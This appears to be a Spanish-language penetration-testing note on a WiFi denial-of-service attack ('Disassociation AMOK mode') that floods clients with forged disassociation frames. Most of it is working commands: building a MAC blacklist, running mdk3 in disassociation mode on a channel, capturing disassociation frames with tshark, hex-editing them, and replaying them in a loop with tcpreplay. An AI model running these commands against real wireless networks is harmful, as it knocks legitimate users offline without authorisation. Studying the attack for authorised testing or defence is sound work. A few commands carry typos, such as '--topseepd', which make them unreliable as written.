# DISASSOCIATION AMOK MODE

El ataque **Disassociation AMOK mode** o *Desasociación AMOK mode* explota una vulnerabilidad en el protoclo de autenticación y asociación del AP. Durante el proceso de conexión, el cliente envía un paquete de asociación al AP solicitando la conexión, y el AP responde con una confirmación. Este ataque consiste en enviar una gran cantidad de paquetese de desasociación falsificados a los clientes, forzándolos a desconectarse y generando tráfico execesivo en la red. Esto puede sobrecargar tanto a los clientes como al AP, provocando desconexiones frecuentes de los clientes legítimos.

---
# Exploit 

Como vimos en la fase de [[0. Hacking WiFi#Pre-Explotación]], es necesario llevar a cabo ciertas configuraciones previas para poner nuestra interfaz en modo monitor, matar ciertos procesos, etc. En este caso podríamos hacer uso de la herramienta `mdk3` para utilizar la funcionalidad de emisión de tramás de desasociación o, también podríamos hacer uso de herramientas como `tshark` / `wireshark` y `tcpreplay`.
###### Using `mdk3`

Lo primero que tenemos que hacer es crear una **blacklist** (Lista de clientes a desasociar) o **whitelist** (Lista de direcciones mac permitidas).

```bash
echo '00:11:22:33:44:55' > blacklist.txt
```

Una vez creada la list, podríamos hacer uso de la herramienta `mkd3` para enviar tramas de desasociación a los clientes de, en este ejemplo, la **blackslit**.

```bash
sudo mdk3 {interface} d -w blacklist.txt -c {channel}
```
###### Using `tshark` and `tcpreplay`

Lo primero que tenemos que hacer es capturar el tráfico de red para obtener tramas de desasociación.

```bash
sudo tshark -i {interface} -Y "wlan.fc.type_subtype == 0xA" -w {capture}.cap
```

En caso de querer hacer uso de `wireshark`, podríamos usar el filtro de visualización `wlan.fc.type_subtype == 0xA`. 

Nuevamente, similar al ataque [[Bandwidth Hijacking#Editing package]], haremos uso de la herramienta `ghex` o cualquier editor hexadeciaml para modificar las tramas de desasociación a gusto.

Tras la edición de estas tramas, haremos uso de `tcpreplay` para enviar repetidamente las tramas de desasociación modificadas.

```bash
sudo tcpreplay --intf1={interface} --topseepd --loop=2000 {deauth_modified_package}.pcap
```